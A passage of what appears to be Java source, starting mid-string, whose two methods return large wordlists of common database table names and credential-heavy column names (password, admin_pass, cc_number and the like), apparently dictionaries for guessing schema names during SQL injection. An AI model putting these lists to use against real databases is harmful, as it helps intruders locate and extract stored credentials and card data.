er#stusers#stuseres#dbstaff#db_staff#staff_db#database#databases#test_user#user_test#test_users#users_test#Gruppe#Gruppen#guanli#guanliyuan#h_admin#Bilder#Mitgliederbereich#key#keywords#Anmeldung#Protokolle#Mitglied#Mitgliederliste#Mitglieder#mima#mm#mpassword#musername#Film#Filme#nc#new#Namen#Auftrag#Bestellungen#Passwort#power#psw#pswd#pw#pwd1#jhu#webapps#ASP#Microsoft#sing#singup#singin#registeration#reg#registriert#root#roots#Tagung#Sitzungen#Einstellungen#Standorte#Statistiken#sys#Systemadministratoren#systime#Tisch#Tabellen#Titel#u#u_n#u_name#u_p#u_pass#Benutzer#user_pw#Benutzerliste#userpasswd#usr_pw#usrs#Benutzername#Benutzernamen#vip#Webbenutzer#sb_host_adminActiveDataFeed#Kategorie#Land#Suchoptionen#Serie#Staaten#UnterkKlasse#Umfrage#TotalMembers#Veranstaltungsort#Veranstaltungsorte#Ansicht1#utilisateur#trier#compte#comptes#administrer#administrables#administrateur#administrateurs#auteur#livre#entreprise#concessionnaire#concessionnaires#telecharger#groupe#groupes#liens#connexion#principal#gestionnaire#membre#membres#films#nom#noms#ordre#commandes#partenaire#partenaires#passe#asse#enregistrs#paramtres#statistiques#super#tester#utilisateurs#intranet_users#utlisateur#Catogorie#Pays#Sujets#Sondage#Titres#Lieux#Affichage1Affichage1edu#win#pc#windows#mac#edu#bayviewpath#bayview#server#slserver#ColdFusion8#ColdFusion#Cold#Fusion8#Fusion#ststaff#sb_host_adminAffichage1#Affichage1#yhm#yhmm#Affichage1name#sb_host_adminAffichage1name#TypesTab#utenti#categorie#attivita#comuni#discipline#Clienti#gws_news#SGA_XPLAN_TPL_V$SQL_PLAN#emu_services#nlconfig#oil_bfsurvey_pro#oil_users#oil_menu_types#oil_polls#Accounts#oil_core_log_searches#SGA_XPLAN_TPL_V$SQL_PLAN_SALL#oil_phocadownload_categories#gws_page#oil_bfsurveypro_choices#oil_poll_data#oil_poll_date#argomento#oil_modules#ruolo#oil_contact_details#emu_profiles#user_connection#oil_poll_menu#jos_jf_tableinfo#oil_templates_menu#oil_messages_cfg#oil_biolmed_entity_types#oil_phocagallery_votes#oil_core_acl_aro#regioni#oil_modules_menu#dati#gws_admin#oil_phocagallery_user_category#articoli#oil_content_frontpage#cron_send#oil_biolmed_measures#comune#SGA_XPLAN_TPL_DBA_TABLES#esame#oil_session#oil_phocadownload_licenses#oil_weblinks#oil_messages#oil_phocagallery_votes_statistics#dcerpcbinds#oil_jf_content#SGA_XPLAN_TPL_DBA_CONS_COLUMNS#SGA_XPLAN_TPL_DBA_IND_COLUMNS#gruppi#Articoli#gws_banner#gws_category#soraldo_ele_tipo#db_version#SGA_XPLAN_TPL_DBA_TAB_COLS#oil_biolmed_thesis#jos_languages#mlmail#SGA_XPLAN_TPL_V$SQLTEXT_NL#oil_bannertrack#oil_core_log_items#oil_rokversions#oil_bfsurveypro_34#oil_bfsurveypro_35#oil_google_destinations#gws_product#oil_jf_tableinfo#oil_phocadownload#oil_biolmed_blocks#oil_bfsurvey_pro_example#oil_bfsurvey_pro_categories#oil_bannerclient#oil_core_acl_aro_sections#SGA_XPLAN_TPL_V$SQL#oil_biolmed_land#connections#not_sent_mails#sga_xplan_test#oil_languages#utente#documento#gws_purchase#oil_plugins#oil_phocagallery#oil_menu#oil_biolmed_measures_by_entity_types#offers#anagrafica#gws_text#oil_groups#oil_content_rating#sent_mails#oil_banner#oil_google#gws_jobs#eventi#mlattach#oil_migration_backlinks#oil_phocagallery_categories#downloads#mlgroup#oil_sections#decodifica_tabelle#oil_phocagallery_img_votes#oil_phocagallery_img_votes_statistics#oil_dbcache#oil_content#p0fs#oil_biolmed_entity#oil_rokdownloads#oil_core_acl_groups_aro_map#gws_client#decodifica_campi#oil_phocagallery_comments#oil_categories#oil_newsfeeds#oil_biolmed_measurements#oil_phocadownload_user_stat#oil_core_acl_aro_groups#SGA_XPLAN_TPL_V$SQL_PLAN_STAT#oil_core_acl_aro_map#dcerpcrequests#oil_phocadownload_sections#oil_components#discipline_utenti#jos_jf_content#oil_phocadownload_settings#SGA_XPLAN_TPL_DBA_CONSTRAINTS#oil_biolmed_technician#oil_stats_agents#SGA_XPLAN_TPL_DBA_INDEXES#Avion#departement#Compagnie#produits#spip_auteurs#BDDJoueurs_alliance#spip_articles#spip_syndic#pays#spip_auteurs_rubriques#spip_mots_forum#spip_signatures#diplomatie#spip_mots_breves#spip_forum#spip_auteurs_messages#spip_documents#spip_messages#spip_index_dico#spip_meta#spip_petitions#spip_mots_syndic#spip_types_documents#etudiant#spip_groupes_mots#spip_documents_articles#spip_rubriques#spip_breves#agenda#BDDJoueurs_colonies#spip_mots_articles#spip_mots#spip_syndic_articles#spip_auteurs_articles#spip_mots_rubriques#BDDJoueurs#modulephoto#nuke_cities#forums#nuke_banner_positions#nuke_subscriptions#nuke_downloads_categories#nuke_journal_comments#nuke_bbranks#spip_documents_rubriques#nuke_confirm#service#nuke_bbthemes_name#nuke_autonews#nuke_bbdisallow#nuke_reviews_add#EDITEUR#nuke_links_newlink#nuke_faqcategories#etudiants#nuke_stats_year#nuke_bbsmilies#spip_mots_documents#spip_documents_breves#nuke_bbsearch_results#post#nuke_users_temp#nuke_blocks#nuke_reviews_main#themes#nuke_modules#nuke_banner_plans#nuke_links_votedata#spip_referers#inscription#BONUS#nuke_links_editorials#nuke_topics#nuke_bbprivmsgs_text#chatbox#nuke_referer#nuke_bbauth_access#nuke_journal_stats#nuke_faqanswer#nuke_banner_terms#message#nuke_bbvote_voters#nuke_pages_categories#spip_index#modulerubriquephoto#spip_visites#Role#nuke_public_messages#actualites#nuke_reviews_comments#nuke_downloads_votedata#nuke_headlines#nuke_downloads_editorials#enseignant#modulemessage#nuke_session#nuke_queue#nuke_main#nuke_bbposts#spip_ortho_cache#Enseignant#nuke_downloads_newdownload#sons#plurielanim#nuke_bbforums#nuke_bbsearch_wordmatch#nuke_bbvote_results#nuke_stats_date#nuke_bbwords#nuke_bbcategories#typecompte#nuke_stories#nuke_stats_month#personne#etablissement#nuke_counter#indexation#nuke_poll_desc#nuke_links_links#nuke_bbtopics#Utilisateurs#nuke_related#nuke_downloads_downloads#spip_versions_fragments#nuke_bbgroups#nuke_bbtopics_watch#nuke_bbuser_group#nuke_downloads_modrequest#spip_versions#Joueur#nuke_bbsessions#nuke_links_categories#directeur#Etudiant#nuke_bbposts_text#nuked_page#Personne#nuke_bbbanlist#Parametre#nuke_pollcomments#nuke_bbforum_prune#nuke_pages#nuke_links_modrequest#nuke_stats_hour#nuke_groups_points#nuke_reviews#nuke_bbthemes#modulemailling#agence#nuke_encyclopedia#nuke_bbsearch_wordlist#nuke_message#Equipe#nuke_comments#nuke_poll_check#nuke_journal#nuke_stories_cat#nuke_banner#nuke_groups#spip_visites_articles#nuke_encyclopedia_text#spip_referers_articles#nuke_bbvote_desc#Artiste#nuke_poll_data#nuke_bbprivmsgs#spip_ortho_dico#spip_caches#guestbook#binn_forum_settings#binn_forms_templ#binn_catprops#currency#binn_imagelib#binn_news#phpshop_opros_categories#binn_articles_messages#binn_cache#binn_bann_temps#binn_forum_threads#voting#binn_update#terms#binn_site_users_rights#binn_vote_options#binn_texts#binn_forum_temps#binn_order_temps#binn_basket#binn_order#binn_system_log#binn_vote_results#binn_articles#phpshop_categories#binn_maillist_temps#binn_system_messages#binn_articles_temps#binn_search_temps#banners#binn_imagelib_templ#binn_faq#binn_bann#phpshop_news#binn_menu_templ#binn_maillist_settings#binn_docs_temps#binn_bann_restricted#phpshop_system#binn_calendar_temps#binn_forum_posts#binn_cform_settings#phpshop_baners#phpshop_menu#binn_forms_fields#binn_cform_list#binn_vote#phpshop_links#mapdata#binn_submit_timeout#binn_forum_themes_temps#binn_order_elems#binn_templates#binn_cform#binn_catalog_template#binn_ct_templ_elems#binn_template_elems#binn_rubrikator_tlevel#binn_settings#binn_pages#binn_users#binn_categs#binn_page_elems#binn_site_users_temps#binn_vote_temps#binn_rubrikator_temps#binn_faq_temps#binn_sprav#setup_#binn_basket_templ#binn_forum_maillist#binn_news_temps#phpshop_users#binn_catlinks#binn_sprav_temps#binn_maillist_sent#binn_forms_templ_elems#jubjub_errors#binn_maillist#binn_catrights#binn_docs#binn_bann_pages#binn_ct_templ#binn_menu#binn_user_rights#binn_cform_textarea#binn_catalog_fields#vykachka#binn_menu_tlevel#phpshop_opros#binn_form39#binn_site_users#binn_path_temps#order_item#tt_content#kunde#medien#Mitarbeiter#fe_users#dwp_wetter#dwp_popup#voraussetzen#dwp_foto_pictures#dwp_karte_speisen#dwp_news_kat#dwp_structur#dwp_foto_album#dwp_karte_kat#bestellung#dwp_content#be_users#Vorlesungen#dwp_content_pic#dwp_link_entries#dwp_ecard_album#persons#dwp_buchung_hotel#dwp_link_kat#dwp_news_absatz#Assistenten#Professoren#Studenten#dwp_ecard_pictures#lieferant#dwp_bewertung#mitarbeiter#gruppe#dwp_news_head#wp_post2cat#phpbb_forum_prune#crops#mein_doc#artikel_kategorie#kategorien#rel_person_paper#tx_tcdirectmail_bounceaccount#Akten#skins#riddles#ci_slogans#phpbb_vote_voters#account_map_event#roles#stellen#meetings#special_category#rel_paper_topic#kbase_category#attribut#phpbb_auth_access#zo_gruppe_stelle#zo_kontakt_stelle#hoeren#shop_settings#tutorial#motd_coding#artikel_variationsgruppen#dwp_kontakt#papers#gesuche#zahlung_weitere#ts2_server_privileges#artikel_variationen#artikel_optionen#chessgames#portale#products_images#phpbb_privmsgs_text#kurs#KUNDE#wp_linkcategories#tx_tcdirectmail_targets#tx_templavoila_datastructure#Adresse#bestellung_kunde#rel_person_topic#css_file#visual#account_multi#Adressen#phpbb_words#phpbb_disallow#kauf_artikel#music_association#phpbb_banlist#dokumente#greylist#backup#map_event#kreditkarte#house_extensions#address_book#crops_tpl#phpbb_vote_desc#versandkostenpreise#pruefen#gruppen#vertreter#phpbb_confirm#verkaeufer#be_groups#rel_person_organization#phpbb_privmsgs#buecher#kategorie#phpbb_sessions#phpbb_search_results#studierende#user_online_newyear#hersteller#object_link#adresse#address_format#newsletter_recipients#PERMISSIONS#user_uploads_pictures#festplatte#veranstalter#mein_doc_h#tx_tcdirectmail_clicklinks#phpbb_vote_results#phpbb_topics_watch#tx_tcdirectmail_lock#account_map#standort#gd#delete_reasons#tx_tcdirectmail_sentlog#valhalla#vis_typen#counter#kbase_main#music_items#kauf#payment_qenta#seite_abschnitt#trivia#mehrwertsteuer#massenmail#klassen#hilfe#geraet#tt_address#dg_books#portal_access#orders_recalculate#artikel_bestellung#kontakt#chesshistory#notizen#seite_layout#virgator_table#wp_categories#chessmessages#endereco#pessoa#usuarios#estado#pedidos#CLIENTE#itens#telefone#empresa#PRODUTO#categoria#cidades#clientes#produtos#municipio#cliente#LT_PROCEDIMENTO#calendario#D_US_FAVORITOS#moradia#pessoa_telefone#contador#aidf#resumo#add_irm#M_ESQUEMA_PERMISSAO#duvida#LT_METODO_ATUALIZACAO#M_RELATORIOS#LT_SERIE#estados#LT_OBJETO#cidade#declaracaonf#especieaidf#S_SESSOES#D_PR_HONORARIOS#empresa_atividade#correcaostrategy#jos_docman_groups#D_US_RECENTE#notafiscal#solicitacao#pessoa_endereco#atividade#M_FATURAS#D_PR_APENSOS#agencia#LT_LANCAMENTO#D_US_AREA_DE_TRABALHO#D_FA_ITENS#dist_universidade#multastrategy_faixamulta#LT_TIPO_DE_ACAO#D_PR_EVENTOS#D_FA_PARCELAS#tipodeducao#D_PR_PARCELAMENTO#sala#D_US_EQUIPES_DO_USUARIO#cidadao#documentos#S_GLOBAL#M_CADASTRO_GERAL#jos_docman_licenses#guiaavulsa#solicitacaosenha#M_CUBOS#promocoes#grau_escolaridade#imagens#multastrategy#D_PR_PARTES#processo#gestor#imagem#categorias#LT_CLASSE_FORO#jurosstrategy#deducao#S_PARAMETROS#notafiscal_deducao#CAIXA#foto#M_FERIADOS#S_ORIGENS#guiaavulsa_itemguiaavulsa#situacaoitem#notafiscal_itemnotafiscal#cotacao#papel#M_EMAIL_FILA#D_PR_OBJETOS#dados_prefeitura#S_LOG#LT_FASE#D_PR_ADVOGADOS#M_USUARIO#projeto#LT_SITUACAO#D_PR_CUSTAS#grupoatividade#LT_NATUREZA#membros_familia#instituicao#emprestimos#itemguiaavulsa#D_EM_DESTINATARIO#LT_GRUPO#S_SEQUENCIAS#itemnotafiscal#disciplina#jos_docman#autorizacaonfe#tipo_bolsa#estoque#LT_JURISDICAO#serie#sse_estudante#LT_FOROS#perfil#despesa_familia#noticias#LT_GARANTIA#M_ESQUEMA_HORARIO#MM_NOTIFICACOES_DO_PROCESSO#jos_jce_plugins#grau_parentesco#D_PR_GARANTIAS#M_SERVICOS_PRESTADOS#LT_CATEGORIA#faixamulta#encerramento#M_PROCESSOS#dados_familia#MM_USUARIOS_DO_PROCESSO#LT_ENCERRAMENTO#LT_DECISAO#indice#contador_empresa#sse_familia#D_SE_INDICES#cursos#estado_civil#dados_estudante#LT_EQUIPES#LT_PROGNOSTICO#LT_EVENTO#jos_jce_groups#D_PR_DOCUMENTOS#D_PR_DESDOBRAMENTOS#logradouro#despesa_aluno#fiscal#LT_CUSTOM4#convite#manutencao#LT_CUSTOM1#LT_CUSTOM2#LT_CUSTOM3#jos_respuestas#DEPARTAMENTO#EMPLEADO#TRABAJA_EN#DEPENDIENTE#LOCALIZACIONES_DEPT#PROYECTO#lineas_fac#pueblos#NUEVOS#CENTROS#BANCOS#PERSONAL#SUCURSALES#PRODUCTOS#provincias#jos_estadisticas#USUARIO#ALUM#MOVIMIENTOS#ACTOR#nuke_gallery_rate_check#ANTIGUOS#CUENTAS#vendedores#CLIENTES#articulos#DEPARTAMENTOS#PROFESORES#jos_preguntas#PEDIDOS#EMPLEADOS#nuke_gallery_pictures_newpicture#Books#grupo#facturas#aclaraciones#preguntas#personas#estadisticas#url#cdb_adminactions#BlockInfo#cdb_attachtypes#cdb_attachments#mymps_lifebox#cdb_buddys#mymps_payapi#LastDate#cdb_medals#mymps_payrecord#cdb_forumlinks#cdb_adminnotes#cdb_admingroups#cdb_creditslog#stkWeight#mymps_checkanswer#cdb_announcements#cdb_bbcodes#cdb_advertisements#cdb_memberfields#mymps_telephone#cdb_forums#cdb_forumfields#cdb_favorites#cdb_banned#cdb_crons#cdb_access#cdb_invites#sysmergeschemaarticles#CodeRuleType#cdb_membermagics#cdb_imagetypes#cdb_memberspaces#cdb_campaigns#pw_wordfb#cdb_paymentlog#cdb_adminsessions#pw_adminset#seen#t_snap#MSmerge_altsyncpartners#zl_deeds#pw_styles#pw_announce#cdb_pluginvars#pw_smiles#cdb_modworks#ncat#mymps_member_tpl#pw_threads#zl_admin#cdb_onlinetime#cdb_mythreads#cdb_members#spt_datatype_info#mymps_certification#mymps_badwords#seentype#mymps_cache#zl_article#spt_datatype_info_ext#cdb_debateposts#mymps_corp#mymps_member_album#mgbliuyan#pw_schcache#zl_finance#pw_banuser#mymps_news#cdb_pluginhooks#mymps_member_docutype#wp1_categories#cdb_magicmarket#MSmerge_errorlineage#cdb_activities#zl_baoming#cdb_orders#ad_ad#cdb_pms#cdb_magics#cdb_itempool#phpcms_announce#pw_actions#pw_msg#mymps_news_img#cdb_debates#cdb_magiclog#pw_forums#mymps_channel#cdb_polls#t_stat#pw_attachs#cdb_plugins#pw_membercredit#cdb_posts#mymps_member_category#cdb_activityapplies#zl_media#acctmanager#pw_usergroups#cdb_faqs#cdb_onlinelist#pw_hack#mymps_member_comment#Market#mymps_config#mymps_mail_template#mymps_advertisement#MSrepl_identity_range#pw_favors#mymps_crons#pw_config#pw_credits#cdb_failedlogins#mymps_member_docu#pw_posts#cdb_attachpaymentlog#cdb_myposts#cdb_polloptions#wp1_comments#cdb_caches#pw_members#mymps_upload#spt_provider_types#pw_sharelinks#pw_tmsgs#pw_polls#cdb_moderators#pw_bbsinfo#aliasregex#userfiles#acctmanager2#cdb_pmsearchindex#mymps_news_focus#cdb_forumrecommend#publishers#zl_advertisement#guanggaotp#pw_memberinfo#aliastype#mymps_mail_sendlist#mymps_navurl#kullanici#kullanicilar#yonetici#yoneticiler#adres#adresler#yayincilar#yayinci#urun#urunler#kategori#kategoriler#ulke#ulkeler#siparis#siparisler#bayi#bayiler#stok#reklam#reklamlar#site#siteler#sayfa#sayfalar#icerik#icerikler#yazi#yazilar#genel#istatistik#istatistikler#duyuru#duyurular#haber#haberler#komisyon#ucret#ucretler#bilgi#basvuru#basvurular#kontak#kontaklar#adminstbl#admintbl#affiliateUsers#hsa_user#tblmanager#tblmanagers#tblproduct#tblproducts#tuser#tusers#userstbl#usertbl#user_data#accounts#admin#baza_site#benutzer#category#comments#company#credentials#Customer#customers#data#details#dhruv_users#dt_tb#employees#events#forsale#friends#giorni#images#info#items#kontabankowe#login#logs#markers#members#messages#orders#order_table#photos#player#players#points#register#reports#rooms#shells#signup#songs#student#students#table#table2#tbl_images#tblproduct#testv2#tickets#topicinfo#trabajo#user#user_auth#userinfo#user_info#userregister#users#usuarios#utenti#wm_products#wp_payout_history#zamowienia#wp_blogmeta#wp_blogs#wp_blog_versions#wp_commentmeta#wp_comments#wp_links#wp_options#wp_postmeta#wp_posts#wp_registration_log#wp_signups#wp_site#wp_sitemeta#wp_termmeta#wp_term_relationships#wp_terms#wp_term_taxonomy#wp_usermeta#wp_users#assets#bannerclient#banner#bannertrack#categories#components#contact_details#content_frontpage#content_rating#content#core_acl_aro_groups#core_acl_aro_map#core_acl_aro_sections#core_acl_aro#core_acl_groups_aro_map#core_log_items#core_log_searches#extensions#groups#languages#menu#menu_types#messages_cfg#messages#migration_backlinks#modules_menu#modules#newsfeeds#plugins#poll_data#poll_date#poll_menu#polls#redirect_links#Schemas#sections#session#stats_agents#templates_menu#template_styles#update_categories#update_sites_extensions#update_sites#updates#usergroups#user_profiles#users#user_usergroup_map#viewlevels#weblinks#";
+        data = data.replace("#","\n");
+        return data;
+    }
+
+    //数据库字段
+    private String sql_columns(){
+        String data = "id#name#user_id#description#username#type#title#userid#group_id#first_name#itemid#category_id#firstname#code#pno#nextval#hostid#table_name#cid#email#smtp_helo#platformid#dept_id#album_id#key_#the#child_cfg#jid#platform#expression#functionid#smtp_server#uid#clock#alarmid#alertid#private_key#actionid#triggerid#triggertemplateid#local_spi#delay#sid#mediaid#peer_cfg#smtp_email#order_id#shared_secret#itemtemplateid#certificate#insertid#role_id#song_id#item_id#product_id#blob_id#distip#artist_id#empno#customer_name#grade#branch_name#portal_id#deptno#data#rid#app_id#class#loan_number#countryid#enabled#fname#country#ename#object_id#idtype#groupid#rowid#accno#account_number#event#passwd#sequence_id#datarow#owner_id#display#pid#venue#locked#eno#serviceid#alias#categoryid#canoccupantsinvite#keyword#channel_id#loginrestrictedtonickname#registrationenabled#logenabled#ip#maxnumber#tag_id#alert_id#cananyonediscoverjid#address#sumdatarow#emp_id#ono#anyone#surname#subdomain#maxusers#ccc#datacol#os#status_id#node_id#essn#last_name#iteration#canchangenickname#canoccupantschangesubject#membersonly#created_by#succ_rate#dnumber#service_id#mid#publicroom#propvalue#empty_days#moderated#customer_id#wdatarow#persistent#authorid#patch_status_id#submitted_by#resolution_id#osvendor#routeid#arch#fid#assigned_to#ns#event_id#problem_code#city#note#channel#element_id#cat_id#position_id#schema_id#area#bug_category_id#session_id#project_id#random#nsprefix#archive_id#nsschema#view_id#pname#bug_group_id#lastname#link_id#langid#catname#bug_id#magic_string#m_id#zip#patch_category_id#custno#idcountry#stopid#identifier#category#isbn#group_project_id#extension_id#state#password#page#extension#spellid#dno#instanceof#network#priority#aname#person_id#ncbofile#student_number#term_id#uno#path_id#aid#location_id#propertyno#course_number#tid#langug_code#variable#dept_desc#orderno#ownerno#partof#clientno#white#macaddr#jobtypeid#direction#md5sum#orga_id#parentcategoryid#beginstateid#mname#qno#src#featurename#client_id#route_id#ticker#version#modulename#maty_id#currentstateid#userinfo_id#column_id#imageinfo_id#staffno#lid#metadatainfoid#context#app_title#dest#attributecategory_id#operation_type#dnum#pers_id_registerer#datasource#connectorid#our_loc#country_name#dname#capital#search_id#statechangeid#rightid#endstateid#distconnectorid#walnut#distmacaddr#pixsize#jobid#revid#match_cid#branchno#prepend_digits#stockno#ncbofileid#object_type#type_id#pubid#qagent#office#db_name#bank#dummy#storyname#col#petty#qname#store_id#inv_id#inventory#gift#cno#item#c_sec_id#row_id#price#loc_id#ssn#c_id#sname#parent#allowance#color#group_name#accounts#vendorid#gifi_accno#movie_id#rate#company#subid#commentpath#protocol_action_id#topic_id#s_id#config_id#long#link#copyright#vehicle#customerid#customer#f_id#chart_id#url#host#loans#charttype#imagefile#data_set_id#guest_ip#biosample_id#affiliation_id#os_id#street_id#book_code#object_name#start_date#form_id#itemno#provincial#confid#ratingid#drinker#qname_id#whatsdom#config_name#ship_id#investigator_id#smilies_id#cal_id#license_id#conf#contact_id#procedure_id#column_name#chromosome_id#tf_key#agent_specialtyid#users_id#gid#publisher_code#setting#format_id#word#slogan#superssn#product#referredby#operationid#ban_ip#p_id#lbl_aom_unaccessible_shipmethod#origin#comment_id#product_version#probe_id#orderdate#ordernumber#data_type_id#publisherid#lake_id#course_id#questionid#student_id#user_name#answerid#hashtag#preference_id#author_num#branch_num#derived_id#factoryid#filterid#log#pnumber#specialtyid#plugin_id#aa#file#dept_number#action_attribute_id#cpr#storeid#progenitor_id#staff_number#deptid#semester#poi_id#part_id#cell_line_id#transaction_id#agentid#regionid#token#serial_no#experimental_data_set_id#cp_id#the_geom#model#o_id#personid#display_name#salesperson_id#dependent_name#license#tablename#employee_id#e_id#id_group#location#bb#languageid#int4#msg_id#department#book_id#ingredientid#action_type_id#maker#app#id_customer#this#entry_id#county_id#protocol_type_id#empnbr#unit_number#bar#studentid#dbid#title_id#cname#emp_num#owner#course_name#editionnumber#sessionid#mealid#com_id#text#chip_layout_id#watchlistid#qty#data_set_type_id#orderid#module_id#c1#dlocation#domainid#course_no#mgrssn#id_log#access_control_type_id#account_id#checking#protocol_id#request_id#settingsid#lname#sale_date#module_addr#flag#usuario#nombre#contrasena#consumidor#clave#tecla#llave#chaveta#tono#cuna#correo#contrasenia#benutzername#benutzer#passwort#kennwort#parole#losungswort#losung#kennung#motto#stichwort#schlusselwort#utilisateur#usager#consommateur#nom#mot#passe#cle#touche#clef#utente#nome#utilizzatore#parola#chiave#tasto#pulsante#chiavetta#cifrario#usufrutuario#chave#cavilha#korisnik#sifra#lozinka#kljuc#isim#ad#adi#soyisim#soyad#soyadi#kimlik#kimlikno#tckimlikno#tckimlik#yonetici#sil#silinmis#numara#sira#lokasyon#kullanici#kullanici_adi#sifre#giris#pasif#posta#adres#is_adres#ev_adres#is_adresi#ev_adresi#isadresi#isadres#evadresi#evadres#il#ilce#eposta#eposta_adres#epostaadres#eposta_adresi#epostaadresi#e-posta#e-posta_adres#e-postaadres#e-posta_adresi#e-postaadresi#e_posta#e_posta_adres#e_postaadres#e_posta_adresi#e_postaadresi#baglanti#gun#ay#yil#saat#tarih#guncelleme#guncellemetarih#guncelleme_tarih#guncellemetarihi#guncelleme_tarihi#yetki#cinsiyet#ulke#guncel#vergi#vergino#vergi_no#yas#dogum#dogumtarih#dogum_tarih#dogumtarihi#dogum_tarihi#telefon_is#telefon_ev#telefonis#telefonev#ev_telefonu#is_telefonu#ev_telefon#is_telefon#evtelefonu#istelefonu#evtelefon#istelefon#kontak#kontaklar#user#pass#cc_number#emri#fjalekalimi#pwd#customers_email_address#customers_password#user_password#user_pass#admin_user#admin_password#admin_pass#usern#user_n#users#login#logins#login_user#login_admin#login_username#user_username#user_login#auid#apwd#adminid#admin_id#adminuser#adminuserid#admin_userid#adminusername#admin_username#adminname#admin_name#usr#usr_n#usrname#usr_name#usrpass#usr_pass#usrnam#nc#myusername#mail#emni#logohu#punonjes#kpro_user#wp_users#emniplote#perdoruesi#perdorimi#punetoret#logini#llogaria#fjalekalimin#kodi#emer#ime#korisnici#user1#administrator#administrator_name#mem_login#login_password#login_pass#login_passwd#login_pwd#psw#pass1word#pass_word#passw#pass_w#user_passwd#userpass#userpassword#userpwd#user_pwd#useradmin#user_admin#mypassword#passwrd#admin_pwd#admin_passwd#mem_password#memlogin#e_mail#usrn#u_name#uname#mempassword#mem_pass#mem_passwd#mem_pwd#p_word#pword#p_assword#myname#my_username#my_name#my_password#my_email#cvvnumber#about#access#accnt#accnts#account#admin#adminemail#adminlogin#adminmail#admins#aim#auth#authenticate#authentication#blog#cc_expires#cc_owner#cc_type#cfg#clientname#clientpassword#clientusername#config#contact#converge_pass_hash#converge_pass_salt#crack#customers#cvvnumber]#db_database_name#db_hostname#db_password#db_username#download#e-mail#emailaddress#full#group#hash#hashsalt#homepage#icq#icq_number#id_member#images#index#ip_address#last_ip#last_login#login_name#login_pw#loginkey#loginout#logo#md5hash#member#member_id#member_login_key#member_name#memberid#membername#members#new#news#nick#number#nummer#passhash#pass_hash#password_hash#passwordsalt#personal_key#phone#privacy#pw#pwrd#salt#search#secretanswer#secretquestion#serial#session_member_id#session_member_login_key#sesskey#spacer#status#store#store1#store2#store3#store4#table_prefix#temp_pass#temp_password#temppass#temppasword#un#user_email#user_icq#user_ip#user_level#user_passw#user_pw#user_pword#user_pwrd#user_un#user_uname#user_usernm#user_usernun#user_usrnm#userip#userlogin#usernm#userpw#usr2#usrnm#usrs#warez#xar_name#xar_pass#account#accnts#accnt#user_id#members#usrs#usr2#accounts#admin#admins#adminlogin#auth#authenticate#authentication#account#access#customers#customer#config#conf#cfg#hash#login#logout#loginout#log#member#memberid#password#pass_hash#pass#passwd#passw#pword#pwrd#pwd#store#store1#store2#store3#store4#setting#username#name#user#user_name#user_username#uname#user_uname#usern#user_usern#un#user_un#usrnm#user_usrnm#usr#usernm#user_usernm#user_nm#user_password#userpass#user_pass#user_pword#user_passw#user_pwrd#user_pwd#user_passwd#fld_id#fld_username#fld_password#loginname#pasword#permission#perm#user_group#tendn#tendangnhap#tenquantri#tenquanly#tennguoidung#ten#tennd#nguoidung#nguoidungid#quantri#quanly#u_id#accountname#account_name#matkhau#matma#paswd#pas#tukhoa#login_pas#loginpassword#loginpasswd#loginpass#loginpas#loginpwd#secret#secret_code#secretcode#administrators#adminpass#adminpassword#adminpaw#adminpwd#adminuid#upass#level#mima#sb_admin_name#sb_pwd#client#clients#ipaddress#files#family#admin_psw#administrateur#adminpsw#adminupass#adress#aide#articleid#content#dw#feed#feedback#glmm#isadmin#key#keywords#mpassword#msn#musername#newsid#numer#passer#pe_aduser#pe_user#power#pswd#pwd1#qq#stocker#sysuser#telephone#texte#userpasswd#usr_nusr#usr_pw#website#wind#compte#comptes#objectif#authentifier#authentification#fissure#adressee-mail#complet#groupe#hachage#connexion#membre#membres#mm#p#u#mot_de_passe_bdd#mon_mot_de_passe#monmotdepasse#ignatiusj#caroline-du-nord#nouveau#sel#recherche#utilisateurs#o#konto#rachunki#administratorzy#pomoc#cel#uwierzytelnienia#uwierzytelnianie#kontakt#klient#danych#adres_e-mailowy#grupy#obrazy#spis#dostawcy#nazwisko#zaloguj#nowy#telefon#seryjny#ustawienie#kod#stan#sklep1#sklep2#tekst#zytk#konta#rysa#adrese-mail#ecolo#tat#yh#yhm#yhmm#yonghu#content_id#codigo#geometry#published#section_value#tidcliente#menuid#pollid#bid#moduleid#gab_pergunta#tipo#template#multilinestring#aal_aluno#ava_professor#adm_nivel#lec_codigo#per_codigo#lec_disciplina#gaip_codigo#acl_id#niv_codigo#quantidade#attribute_id#gaia_codigo#alu_matricula#nota#gab_codigo#field_id#ava_codigo#aal_codigo#message_id#avi_codigo#fre_disciplina#groups_id#nome_cliente#pc#lec_professor#idusuario#poll_id#dis_codigo#ava_disciplina#gap_codigo#avp_codigo#aai_codigo#fre_aluno#fre_codigo#adm_id#id_estado#aap_codigo#pro_matricula#gp#xlancamento#municipioprestador#product_price_id#country_2_code#shopper_group_id#manufacturer_id#com_natur#review_id#xtipo_de_acao#bookmark_id#xequipe_padrao#faixas_id#xcliente#deducoes_id#xcategoria#xencerramento#idx_item#xcadastro#quantitens#additional_htmlblob_users_id#ipi#xfase_de_vencimento#permission_id#xdecisao#i_end#xforo#order_item_id#mo#grafica_id#news_id#enderecos_id#desccompensa#desconto#creditcard_id#card_id#cardid#idcard#creditcard#cardnumber#cardno#itens_id#senha#order_status_id#id_seq#municipio_id#additional_users_id#order_status_history_id#function_id#controladas_id#ator_id#shipping_rate_id#htmlblob_id#css_id#xfase#fieldvalueid#main#correcaostrategy_id#fonte#xmetodo_atualizacao#desd_xdecisao#jurosstrategy_id#fielddef_id#especie_id#idcategoria#xgrupo#indice_id#xprocedimento#xcustom1#autor_id#newssummarycategory#icmsinterno#nonnavigable#domicilio_id#notafiscal_id#userplugin_id#shipping_carrier_id#municipiotomador#natureza#solicitante_id#mbpp#xcustom2#template_id#chave_primaria#desd_xforo#payment_method_id#nome_agencia#pessoa_id#uprdescricao#export_id#logo_id#prazo_xevento#tomador_id#serie_id#tidclasfiscais#atividades_id#logradouro_id#xadvogado#xequipe#handler_id#xobjeto#multipolygon#tipo_id#xproprietario#state_id#mopc#valorcontabil#xprocesso#coupon_id#currency_id#parameter_name#contribuinte_id#xcubo#country_id#id_fatura#serienfe_id#tax_rate_id#waiting_list_id#download_id#emissao#screen#xcustom3#mbpc#documento_id#xcustom4#fieldid#point#xsituacao#icmssp#tidproduto#pp#empresa_id#i_tel#contador_id#telefones_id#estado_id#xevento#site#order_currency#xprocesso_apensado#multastrategy_id#saida#grupo_id#guid_sessao#indice#xjurisdicao#news_category_id#mf_category_id#product_type_id#xusuario#vendor_id#sitepref_name#desd_xjurisdicao#option_id#xrelatorio#codusuario#id_cidade#user_info_id#desd_xfase#situacao#file_id#zone_id#id_servico#situacao_id#tidfornece